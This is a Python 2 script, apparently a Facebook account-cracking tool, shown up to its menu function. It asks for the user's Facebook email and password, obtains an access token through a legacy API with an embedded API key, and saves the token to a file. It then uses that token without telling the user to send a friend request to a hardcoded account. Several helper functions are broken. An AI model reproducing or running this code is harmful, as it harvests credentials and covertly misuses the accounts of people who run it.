# BILAL_MASOOM
#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """ -----------------------------•◈•
(  __)\\ ____--------------_------------•◈•
|__(~)    •||•THE - Bilal -OFFICAL------•◈•
|__\~~) •||•BILAL - KHOKHAR---------------•◈•
|__(-----\  •◈•------masoom---------•◈•
|__~~~\ •◈•-----█-------⑦-------█------•◈•
|__~~~\ •◈•-----█-------⑧-------█------•◈•
|__~~~\ •◈•-----█-------⑥-------█------•◈•
\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
\033[1;91m======================================="""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m ============================================================="
print  """\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
\033[1;91m======================================="""
print " \x1b[1;93m============================================================="

CorrectUsername = "bilalmasoom"
CorrectPassword = "bilalmasoom"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
				os.system('xdg-open https://www.Facebook.com/Omi6t')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 4
